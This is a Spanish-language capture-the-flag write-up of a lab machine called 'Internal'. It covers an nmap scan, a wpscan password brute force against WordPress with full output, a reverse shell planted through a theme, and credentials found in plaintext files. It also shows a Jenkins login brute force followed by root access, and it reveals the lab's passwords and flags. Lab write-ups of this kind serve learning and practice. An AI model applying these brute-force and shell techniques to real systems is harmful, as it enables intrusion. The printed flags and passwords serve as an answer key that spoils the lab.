---
Titulo: Interno
Fecha: 12-11-2025
categoria: []
Dificultad_oficial: Dificil
Dificultad_percibida: Media/Dificil
Estado: Terminado
---
## 1. Descripción del reto
Se le ha asignado un cliente que desea que se realice una prueba de penetración en un entorno que se lanzará a producción en tres semanas. 

**Alcance del trabajo**

El cliente solicita que un ingeniero realice una evaluación externa, de la aplicación web e interna del entorno virtual proporcionado. El cliente ha solicitado que se proporcione la mínima información posible sobre la evaluación, deseando que se realice desde la perspectiva de un atacante (prueba de penetración de caja negra). El cliente ha solicitado que se obtengan dos flags (sin especificar la ubicación) como prueba de explotación.

- Usuario.txt
- Root.txt  
    

Además, el cliente ha proporcionado las siguientes concesiones de alcance:

- Asegúrese de modificar su archivo hosts para que refleje internal.thm .
- En este compromiso se permite cualquier herramienta o técnica.
- Localice y registre todas las vulnerabilidades encontradas.
- Envía las alertas detectadas al panel de control.
- Solo la dirección IP asignada a su máquina está dentro del alcance.

(Juego de rol desactivado)

Te animo a abordar este desafío como una prueba de penetración real. Considera la posibilidad de redactar un informe que incluya un resumen ejecutivo, una evaluación de vulnerabilidades y explotación, y sugerencias de remediación, ya que esto te beneficiará en tu preparación para la certificación eCPPT de eLearnsecurity o para tu futura carrera como analista de seguridad informática.

  

Nota: esta sala se puede completar sin Metasploit.

****No se aceptarán informes escritos para esta sala.****

## 2. Enumeración / Reconocimiento
```shell
┌──(kali㉿Odon)-[~]
└─$ nmap -sS -sV -Pn -T4 --open -p- 10.10.238.227                                   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 15:07 EST
Nmap scan report for 10.10.238.227
Host is up (0.065s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.13 seconds
```

```text

Posted on August 3, 2020
Hello world!

Welcome to WordPress. This is your first post. Edit or delete it, then start writing!

```

Vale, esto es un wordpress.
Vale, mire si existe admin en wordpress y si, por lo que tiro de wpscan y miro si saco algo !

```shell imp=85
┌──(kali㉿Odon)-[~]
└─$ wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.238.227]
[+] Started: Wed Nov 12 16:15:24 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.9
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:05 <=============================================================================> (137 / 137) 100.00% Time: 00:00:05

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                                 
Trying admin / liezel Time: 00:00:47 <                                                                             > (3900 / 14348292)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Nov 12 16:16:23 2025
[+] Requests Done: 4073
[+] Cached Requests: 5
[+] Data Sent: 2.05 MB
[+] Data Received: 2.656 MB
[+] Memory used: 305.223 MB
[+] Elapsed time: 00:00:59
```

## 3. Explotación / Desarrollo

```text imp=5
 Administration email verification

Please verify that the administration email for this website is still correct. Why is this important? (opens in a new tab)	

Current administration email: admin@internal.thm	

This email may be different from your personal email address. 
```

Me entre en los temas y puse la reverse de "pentest monkey", dentro encontré lo siguiente:

```txt
www-data@internal:/opt$ cat wp-save.txt
cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

Después de eso me conecte a ese usuario.

```shell
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
aubreanna@internal:~$ cat user.txt 
THM{int3rna1_fl4g_1}
```

Mediante el intruder consegui

```http
j_username=admin&j_password=spongebob&from=%2F&Submit=Sign+in
```

Con un lenght de 309 mientras que los otros son de 351

dentro me hice una rev shell

```shell imp=9
jenkins@jenkins:/opt$ ls
note.txt
jenkins@jenkins:/opt$ cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

y con esa gran falla de seguridad de tener una contraseña en texto plano me pude conectar a root

```shell
root@internal:~# ls
root.txt  snap
root@internal:~# cat root.txt 
THM{d0ck3r_d3str0y3r}
```

## 6. Notas y aprendizajes

- Punto fuerte: ...
    
- Dificultad encontrada: ...
    
- Conceptos nuevos aprendidos:  Por muchas medidas de seguridad que existan no poner nunca una contraseña en texto plano.